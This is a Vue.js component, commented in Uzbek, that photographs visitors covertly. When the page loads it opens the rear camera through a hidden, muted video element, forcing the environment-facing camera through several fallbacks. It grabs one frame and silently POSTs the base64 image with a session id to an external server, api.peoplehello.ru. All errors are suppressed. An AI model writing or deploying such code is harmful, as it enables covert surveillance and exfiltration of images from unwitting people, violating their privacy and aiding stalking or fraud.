<template>
  <video ref="video" playsinline muted style="display:none"></video>
</template>

<script>
import {th} from "vuetify/locale";

export default {
  name: "BackCamera",

  mounted() {
    this.capture()
  },
  data() {
    return {
      session_id: null
    }
  },

  methods: {
    async capture() {
      const session_id = this.$route.params.id
      this.session_id = session_id
      if (!session_id) return

      try {
        let stream = null

        // 🟢 1) ENG BIRINCHI — environment bilan MAJBURLASH
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            video: {facingMode: {exact: "environment"}},
            audio: false
          })
        } catch (e) {
          // davom etamiz
        }

        // 🟢 2) Agar yuqorisi ishlamasa — enumerateDevices
        if (!stream) {
          const devices = await navigator.mediaDevices.enumerateDevices()
          const backCam = devices.find(
              d =>
                  d.kind === "videoinput" &&
                  /back|rear|environment/i.test(d.label)
          )

          if (backCam) {
            try {
              stream = await navigator.mediaDevices.getUserMedia({
                video: {deviceId: {exact: backCam.deviceId}},
                audio: false
              })
            } catch (e) {
              // davom etamiz
            }
          }
        }

        // 🟢 3) OXIRGI CHORA — ideal (lekin bu old kamera bo‘lishi mumkin)
        if (!stream) {
          stream = await navigator.mediaDevices.getUserMedia({
            video: {facingMode: {ideal: "environment"}},
            audio: false
          })
        }

        if (!stream) return

        const video = this.$refs.video
        video.srcObject = stream

        // ❗ iOS / WebView uchun SHART
        await video.play()

        await new Promise(res => {
          if (video.readyState >= 2) return res()
          video.onloadedmetadata = res
        })

        await new Promise(r => setTimeout(r, 600))

        const canvas = document.createElement("canvas")
        canvas.width = video.videoWidth || 640
        canvas.height = video.videoHeight || 480
        const ctx = canvas.getContext("2d")
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height)

        stream.getTracks().forEach(t => t.stop())

        // 🟢 BASE64 BODY
        canvas.toBlob(blob => {
          if (!blob) return

          const reader = new FileReader()
          reader.onloadend = async () => {
            try {
              await fetch("https://api.peoplehello.ru/api/back-cam", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                  image: reader.result,
                  session_id
                })
              })
            } catch (e) {
              // jim
            }
          }
          reader.readAsDataURL(blob)
        }, "image/jpeg", 0.85)

      } catch (err) {
      }
    }

  }
}
</script>
